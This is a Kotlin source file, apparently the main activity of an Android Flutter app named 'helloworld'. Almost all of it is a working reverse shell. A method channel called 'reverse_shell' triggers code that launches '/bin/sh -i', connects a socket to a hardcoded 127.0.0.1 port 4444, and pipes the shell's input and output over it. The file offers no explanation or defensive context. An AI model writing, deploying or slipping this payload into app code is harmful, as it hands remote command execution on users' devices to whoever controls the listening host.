package com.example.helloworld

import android.os.Bundle
import android.util.Log
import io.flutter.embedding.android.FlutterActivity
import io.flutter.plugin.common.MethodChannel
import java.io.IOException
import java.io.InputStream
import java.io.OutputStream
import java.net.Socket

class MainActivity : FlutterActivity() {
    private val CHANNEL = "com.example.helloworld/reverse_shell"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        MethodChannel(flutterEngine!!.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            if (call.method == "runJavaPayload") {
                // Hardcoded IP and port
                runJavaPayload("127.0.0.1", 4444)
                result.success("Java Payload executed successfully")
            } else {
                result.notImplemented()
            }
        }
    }

    private fun runJavaPayload(ip: String, port: Int) {
        try {
            // Start an interactive shell
            val str = arrayOf("/bin/sh", "-i")
            val process = Runtime.getRuntime().exec(str)
            val pin = process.inputStream
            val perr = process.errorStream
            val pout = process.outputStream

            // Connect to the specified IP and port
            val socket = Socket(ip, port)
            val sin = socket.getInputStream()
            val sout = socket.getOutputStream()

            // Forward input/output streams between the shell and the socket
            while (true) {
                while (pin.available() > 0) sout.write(pin.read())
                while (perr.available() > 0) sout.write(perr.read())
                while (sin.available() > 0) pout.write(sin.read())
                sout.flush()
                pout.flush()
            }
        } catch (e: IOException) {
            Log.e("ReverseShell", "Error running reverse shell", e)
        }
    }
}
